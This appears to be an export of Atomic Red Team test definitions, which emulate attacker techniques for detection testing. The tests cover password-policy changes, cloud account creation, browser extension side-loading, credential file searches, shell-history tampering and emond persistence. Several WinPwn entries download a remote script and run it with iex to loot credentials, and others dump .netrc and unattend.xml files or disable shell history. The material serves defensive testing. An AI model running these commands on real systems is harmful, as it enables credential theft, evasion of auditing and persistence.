If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the
password policy will likely prevent you from setting the password back to what it was. 
",windows,,,"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",powershell,,,,,"dependencies.0.description: Password for current user must be stored in a credential file

dependencies.0.prereq_command: if (Test-Path #{cred_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cred_file}"") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message ""Enter password for $env:USERNAME to use during password change attempt""
$cred.Password | ConvertFrom-SecureString | Out-File ""#{cred_file}""

","input_arguments.new_password.description: The password to set for the current domain user (default is long and has and upper case and special character and number but no lowercase)

input_arguments.new_password.type: string

input_arguments.new_password.default: UPPER-LONG-SPECIAL-333

input_arguments.cred_file.description: A file containing the password of the current user

input_arguments.cred_file.type: path

input_arguments.cred_file.default: $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt

"
T1098,Account Manipulation,Domain Password Policy Check: Only Two Character Classes,784d1349-5a26-4d20-af5e-d6af53bae460,"Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.
If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the
password policy will likely prevent you from setting the password back to what it was. 
",windows,,,"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",powershell,,,,,"dependencies.0.description: Password for current user must be stored in a credential file

dependencies.0.prereq_command: if (Test-Path #{cred_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cred_file}"") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message ""Enter password for $env:USERNAME to use during password change attempt""
$cred.Password | ConvertFrom-SecureString | Out-File ""#{cred_file}""

","input_arguments.new_password.description: The password to set for the current domain user (default has only upper and lower case characters)

input_arguments.new_password.type: string

input_arguments.new_password.default: onlyUPandLowChars

input_arguments.cred_file.description: A file containing the password of the current user

input_arguments.cred_file.type: path

input_arguments.cred_file.default: $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt

"
T1098,Account Manipulation,Domain Password Policy Check: Common Password Use,81959d03-c51f-49a1-bb24-23f1ec885578,"Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.
If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the
password policy will likely prevent you from setting the password back to what it was. 
",windows,,,"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",powershell,,,,,"dependencies.0.description: Password for current user must be stored in a credential file

dependencies.0.prereq_command: if (Test-Path #{cred_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cred_file}"") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message ""Enter password for $env:USERNAME to use during password change attempt""
$cred.Password | ConvertFrom-SecureString | Out-File ""#{cred_file}""

","input_arguments.new_password.description: The password to set for the current domain user (default is Season and current year combo)

input_arguments.new_password.type: string

input_arguments.new_password.default: Spring$((Get-Date).Year)!

input_arguments.cred_file.description: A file containing the password of the current user

input_arguments.cred_file.type: path

input_arguments.cred_file.default: $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt

"
T1098,Account Manipulation,GCP - Delete Service Account Key,7ece1dea-49f1-4d62-bdcc-5801e3292510,"This Atomic will: 
  - Create a service account
  - Create a service account key, 
  - Store the result of retrieving a single key for that service account as a variable
  - Pass that variable for deletion
  - Delete the service account

The idea for this Atomic came from a Rule published by the Elastic team.

Identifies the deletion of an Identity and Access Management (IAM) service account key in Google Cloud Platform (GCP).
Each service account is associated with two sets of public/private RSA key pairs that are used to authenticate. 
If a key is deleted, the application will no longer be able to access Google Cloud resources using that key. A security best practice is to rotate your service account keys regularly.

Reference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml
",iaas:gcp,,,"gcloud config set project #{project_id}
KEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(KEY_ID)"" --limit=1`
gcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet
",sh,False,,"cd ""$PathToAtomicsFolder/T1098/src/T1098-17/""
terraform state rm google_service_account_key.key
terraform destroy -auto-approve
",sh,"dependencies.0.description: Requires gcloud

dependencies.0.prereq_command: if [ -x ""$(command -v gcloud)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

dependencies.1.description: Check if user is logged in 

dependencies.1.prereq_command: gcloud config get-value account

dependencies.1.get_prereq_command: gcloud auth login --no-launch-browser

dependencies.2.description: Check if terraform is installed.

dependencies.2.prereq_command: terraform version

dependencies.2.get_prereq_command: echo Please install the terraform.

dependencies.3.description: Create dependency resources using terraform

dependencies.3.prereq_command: stat ""$PathToAtomicsFolder/T1098/src/T1098-17/terraform.tfstate""

dependencies.3.get_prereq_command: cd ""$PathToAtomicsFolder/T1098/src/T1098-17/""
terraform init
terraform apply -auto-approve
","input_arguments.project_id.description: ID of the GCP Project you to execute the command against.

input_arguments.project_id.type: string

input_arguments.project_id.default: atomic-test-1

input_arguments.service_name.description: The name of the service account.

input_arguments.service_name.type: string

input_arguments.service_name.default: atomic-service-account

"
T1176,Browser Extensions,Chrome/Chromium (Developer Mode),3ecd790d-2617-4abf-9a8c-4e8d47da9ee1,Turn on Chrome/Chromium developer mode and Load Extension found in the src directory,linux,windows,macos,,manual,,"1. Navigate to [chrome://extensions](chrome://extensions) and
tick 'Developer Mode'.

2. Click 'Load unpacked extension...' and navigate to
[Browser_Extension](../t1176/src/)

3. Click 'Select'
",,,,
T1176,Browser Extensions,Chrome/Chromium (Chrome Web Store),4c83940d-8ca5-4bb2-8100-f46dc914bc3f,"Install the ""Minimum Viable Malicious Extension"" Chrome extension",linux,windows,macos,,manual,,"1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend
in Chrome

2. Click 'Add to Chrome'
",,,,
T1176,Browser Extensions,Firefox,cb790029-17e6-4c43-b96f-002ce5f10938,"Create a file called test.wma, with the duration of 30 seconds
",linux,windows,macos,,manual,,"1. Navigate to [about:debugging](about:debugging) and
click ""Load Temporary Add-on""

2. Navigate to [manifest.json](./src/manifest.json)

3. Then click 'Open'
",,,,
T1176,Browser Extensions,Edge Chromium Addon - VPN,3d456e2b-a7db-4af8-b5b3-720e7c4d9da5,"Adversaries may use VPN extensions in an attempt to hide traffic sent from a compromised host. This will install one (of many) available VPNS in the Edge add-on store.
",windows,macos,,,manual,,"1. Navigate to https://microsoftedge.microsoft.com/addons/detail/fjnehcbecaggobjholekjijaaekbnlgj
in Edge Chromium

2. Click 'Get'
",,,,
T1176,Browser Extensions,Google Chrome Load Unpacked Extension With Command Line,7a714703-9f6b-461c-b06d-e6aeac650f27,"This test loads an unpacked extension in Google Chrome with the `--load-extension` parameter. This technique was previously used by the Grandoreiro malware to load a malicious extension that would capture the browsing history, steal cookies and other user information. Other malwares also leverage this technique to hijack searches, steal passwords, inject ads, and more.

References:
https://attack.mitre.org/techniques/T1176/
https://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/",windows,,,"
# Chromium
$chromium =  ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip""

# uBlock Origin Lite to test side-loading
$extension = ""https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip""

Set-Location ""#{working_dir}""

Set-Variable ProgressPreference SilentlyContinue
Invoke-WebRequest -URI $chromium -OutFile ""#{working_dir}\chrome.zip""
Invoke-WebRequest -URI $extension -OutFile ""#{working_dir}\extension.zip""


Expand-Archive chrome.zip -DestinationPath ""#{working_dir}"" -Force
Expand-Archive extension.zip -Force

Start-Process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -PassThru",powershell,True,,"Set-Location ""#{working_dir}""
Stop-Process -Name chrome -Force
Remove-Item .\chrome.zip, .\chrome-win, .\extension, .\extension.zip -Recurse -Force
Set-Variable ProgressPreference Continue",,,"input_arguments.working_dir.description: Working directory where the files will be downloaded and extracted

input_arguments.working_dir.type: string

input_arguments.working_dir.default: $env:TEMP

"
T1552.001,Unsecured Credentials: Credentials In Files,Find AWS credentials,2b93758e-a8d7-4e3b-bc7b-d3aa8d7ecb17,"Find local AWS credentials from file, defaults to using / as the look path.
",macos,linux,,"find #{file_path} -name ""credentials"" -type f -path ""*/.aws/*"" 2>/dev/null
",sh,,,,,,"input_arguments.file_path.description: Path to search

input_arguments.file_path.type: string

input_arguments.file_path.default: /

"
T1552.001,Unsecured Credentials: Credentials In Files,Extract Browser and System credentials with LaZagne,9e507bb8-1d30-4e3b-a49b-cb5727d7ea79,"[LaZagne Source](https://github.com/AlessandroZ/LaZagne)
",macos,,,"python2 laZagne.py all
",bash,True,,,,,
T1552.001,Unsecured Credentials: Credentials In Files,Extract passwords with grep,bd4cf0d1-7646-474e-8610-78ccf5a097c4,"Extracting credentials from files
",linux,macos,,"grep -ri password #{file_path}
exit 0
",sh,,,,,,"input_arguments.file_path.description: Path to search

input_arguments.file_path.type: string

input_arguments.file_path.default: /

"
T1552.001,Unsecured Credentials: Credentials In Files,Extracting passwords with findstr,0e56bf29-ff49-4ea5-9af4-3b81283fd513,"Extracting Credentials from Files. Upon execution, the contents of files that contain the word ""password"" will be displayed.
",windows,,,"findstr /si pass *.xml *.doc *.txt *.xls
ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
",powershell,,,,,,
T1552.001,Unsecured Credentials: Credentials In Files,Access unattend.xml,367d4004-5fc0-446d-823f-960c74ae52c3,"Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.
If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.
",windows,,,"type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattend\unattend.xml
",command_prompt,True,,,,,
T1552.001,Unsecured Credentials: Credentials In Files,Find and Access Github Credentials,da4f751a-020b-40d7-b9ff-d433b7799803,"This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.
",linux,macos,,"for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
",bash,False,,,,,"input_arguments.file_path.description: Path to search

input_arguments.file_path.type: string

input_arguments.file_path.default: /home

"
T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - sensitivefiles,114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0,Search for sensitive files on this local system using the SensitiveFiles function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sensitivefiles -noninteractive -consoleoutput",powershell,,,,,,
T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - Snaffler,fdd0c913-714b-4c13-b40f-1824d6c015f2,Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Snaffler -noninteractive -consoleoutput",powershell,,,,,,
T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - powershellsensitive,75f66e03-37d3-4704-9520-3210efbe33ce,Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powershellsensitive -consoleoutput -noninteractive",powershell,,,,,,
T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - passhunt,00e3e3c7-6c3c-455e-bd4b-461c7f0e7797,Search for Passwords on this system using passhunt via WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive",powershell,,,"rm -force .\passhunt.exe -ErrorAction Ignore
rm -force .\phunter* -ErrorAction Ignore
rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore",,,
T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - SessionGopher,c9dc9de3-f961-4284-bd2d-f959c9f9fda5,Launches SessionGopher on this system via WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sessionGopher -noninteractive -consoleoutput",powershell,,,,,,
T1552.001,Unsecured Credentials: Credentials In Files,"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",aaa87b0e-5232-4649-ae5c-f1724a4b2798,"Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
SharpCloud -consoleoutput -noninteractive  ",powershell,,,,,,
T1136.003,Create Account: Cloud Account,AWS - Create a new IAM user,8d1c2368-b503-40c9-9057-8e42f21c58ad,"Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time
",iaas:aws,,,"aws iam create-user --user-name #{username}
",sh,False,,"aws iam delete-user --user-name #{username}
",,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

","input_arguments.username.description: Username of the IAM user to create in AWS

input_arguments.username.type: string

input_arguments.username.default: atomicredteam

"
T1136.003,Create Account: Cloud Account,Azure AD - Create a new user,e62d23ef-3153-4837-8625-fa4a3829134d,"Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",azure-ad,,,"Connect-AzureAD
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = $password
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      ",powershell,,,"Remove-AzureADUser -ObjectId ""#{userprincipalname}""",powershell,"dependencies.0.description: Check if AzureAD PowerShell module is installed
dependencies.0.prereq_command: Get-InstalledModule -Name AzureAD
dependencies.0.get_prereq_command: echo ""use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force""
dependencies.1.description: Check if AzureAD PowerShell module is installed
dependencies.1.prereq_command: Update the input arguments so the userprincipalname value is accurate for your environment
dependencies.1.get_prereq_command: echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""
","input_arguments.username.description: Display name of the new user to be created in Azure AD

input_arguments.username.type: string

input_arguments.username.default: atomicredteam

input_arguments.userprincipalname.description: User principal name (UPN) for the new Azure user being created format email address

input_arguments.userprincipalname.type: string

input_arguments.userprincipalname.default: atomicredteam@yourdomain.com

input_arguments.password.description: Password for the new Azure AD user being created

input_arguments.password.type: string

input_arguments.password.default: reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg

"
T1136.003,Create Account: Cloud Account,Azure AD - Create a new user via Azure CLI,228c7498-be31-48e9-83b7-9cb906504ec8,"Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",azure-ad,,,"az login
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
az ad user create --display-name $username --password $password --user-principal-name $userprincipalname
az ad user list --filter ""displayname eq 'atomicredteam'""     ",powershell,,,az ad user delete --id,powershell,"dependencies.0.description: Check if Azure CLI is installed and install manually
dependencies.0.prereq_command: az account list
dependencies.0.get_prereq_command: echo ""use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows""
dependencies.1.description: Check if Azure CLI is installed and install via PowerShell
dependencies.1.prereq_command: az account list
dependencies.1.get_prereq_command: echo ""use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi""
dependencies.2.description: Update the userprincipalname to meet your requirements
dependencies.2.prereq_command: Update the input arguments so the userprincipalname value is accurate for your environment
dependencies.2.get_prereq_command: echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""
","input_arguments.username.description: Display name of the new user to be created in Azure AD

input_arguments.username.type: string

input_arguments.username.default: atomicredteam

input_arguments.userprincipalname.description: User principal name (UPN) for the new Azure user being created format email address

input_arguments.userprincipalname.type: string

input_arguments.userprincipalname.default: atomicredteam@yourdomain.com

input_arguments.password.description: Password for the new Azure AD user being created

input_arguments.password.type: string

input_arguments.password.default: reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg

"
T1562.003,Impair Defenses: HISTCONTROL,Disable history collection,4eafdb45-0f79-4d66-aa86-a3e2c08791f5,"Disables history collection in shells
",linux,macos,,"export HISTCONTROL=ignoreboth
#{evil_command}
",sh,,,,,,"input_arguments.evil_command.description: Command to run after shell history collection is disabled

input_arguments.evil_command.type: string

input_arguments.evil_command.default: whoami

"
T1562.003,Impair Defenses: HISTCONTROL,Disable history collection (freebsd),cada55b4-8251-4c60-819e-8ec1b33c9306,"Disables history collection in shells
",linux,,,"export HISTSIZE=0
#{evil_command}
",sh,,,,,,"input_arguments.evil_command.description: Command to run after shell history collection is disabled

input_arguments.evil_command.type: string

input_arguments.evil_command.default: whoami

"
T1562.003,Impair Defenses: HISTCONTROL,Mac HISTCONTROL,468566d5-83e5-40c1-b338-511e1659628d,"The HISTCONTROL variable is set to ignore (not write to the history file) command that are a duplicate of something already in the history 
and commands that start with a space. This atomic sets this variable in the current session and also writes it to the current user's ~/.bash_profile 
so that it will apply to all future settings as well.
https://www.linuxjournal.com/content/using-bash-history-more-efficiently-histcontrol
",macos,linux,,,manual,,"1. export HISTCONTROL=ignoreboth
2. echo export ""HISTCONTROL=ignoreboth"" >> ~/.bash_profile
3. ls
4. whoami > recon.txt
",,,,
T1562.003,Impair Defenses: HISTCONTROL,Clear bash history,878794f7-c511-4199-a950-8c28b3ed8e5b,"An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. 

In this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo """" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.
",linux,,,"cp $HISTFILE $HISTFILE.OLD
if ((${#HISTFILE[@]})); then echo $HISTFILE; fi
echo """" > $HISTFILE
if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo ""$HISTFILE is larger than 1k""; fi
ls -la $HISTFILE 
cat $HISTFILE
history -c 
if [ $(history |wc -l) -eq 1 ]; then echo ""History cache cleared""; fi
",bash,False,,"mv -f $HISTFILE.OLD $HISTFILE 
",,,
T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTCONTROL environment variable,10ab786a-028e-4465-96f6-9e83ca6c5f24,"An attacker may exploit the space before a command (e.g. "" ls"") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. 

In this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history
",linux,,,"TEST=$(echo $HISTCONTROL)
if [ ""$HISTCONTROL"" != ""ignoreboth"" ]; then export HISTCONTROL=""ignoreboth""; fi
history -c 
ls -la $HISTFILE # "" ls -la $HISTFILE""
if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi
# -> ls -la is not in history cache
if [ ""$HISTCONTROL"" != ""erasedups"" ]; then export HISTCONTROL=""erasedups""; fi
history -c 
ls -la $HISTFILE
ls -la $HISTFILE
ls -la $HISTFILE
if [ $(history |wc -l) -eq 2 ]; then echo ""Their is only one entry for ls -la $HISTFILE""; fi
",bash,False,,"export HISTCONTROL=$(echo $TEST)
",,,
T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTFILESIZE environment variable,5cafd6c1-2f43-46eb-ac47-a5301ba0a618,"An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.

Note: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.
",linux,,,"TEST=$(echo $HISTFILESIZE)
echo $HISTFILESIZE
export HISTFILESIZE=0
if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; fi
# -> $HISTFILESIZE is zero
",bash,False,,"export HISTCONTROL=$(echo $TEST)
",,,
T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTSIZE environment variable,386d3850-2ce7-4508-b56b-c0558922c814,"An Adversary may set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.

Note: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.
",linux,,,"echo $HISTSIZE
export HISTSIZE=0
if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; fi
# -> $HISTSIZE is zero
",sh,False,,"export HISTSIZE=100
",,,
T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTFILE environment variable,b3dacb6c-a9e3-44ec-bf87-38db60c5cad1,"An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.

Note: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.
",linux,,,"TEST=$(echo $HISTFILE)
echo $HISTFILE
export HISTFILE=""/dev/null""
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi
# -> $HISTFILE is /dev/null
",bash,False,,"export HISTFILE=$(echo $TEST)
",,,
T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTFILE environment variable (freebsd),f7308845-6da8-468e-99f2-4271f2f5bb67,"An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.

Note: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.
",linux,,,"echo $HISTFILE
export HISTFILE=""/dev/null""
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi
# -> $HISTFILE is /dev/null
",sh,False,,"export HISTFILE=~/.sh_history
",,,
T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTIGNORE environment variable,f12acddb-7502-4ce6-a146-5b62c59592f1,"An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. 

In this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.
",linux,,,"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='ls*:rm*:ssh*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi
# -> $HISTIGNORE = ls*:rm*:ssh*
history -c 
ls -la $HISTFILE
ls -la ~/.bash_logout
if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi
# -> ls commands are not in history
unset HISTIGNORE

if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi
# -> $HISTIGNORE = *
history -c 
whoami
groups
if [ $(history |wc -l) -eq 0 ]; then echo ""History cache is empty""; fi
# -> History cache is empty
",bash,False,,"unset HISTIGNORE
",,,
T1546.014,Event Triggered Execution: Emond,Persistance with Event Monitor - emond,23c9c127-322b-4c75-95ca-eff464906114,"Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
",macos,,,"sudo cp ""#{plist}"" /etc/emond.d/rules/T1546.014_emond.plist
sudo touch /private/var/db/emondClients/T1546.014
",sh,True,,"sudo rm /etc/emond.d/rules/T1546.014_emond.plist
sudo rm /private/var/db/emondClients/T1546.014
",,,"input_arguments.plist.description: Path to attacker emond plist file

input_arguments.plist.type: path

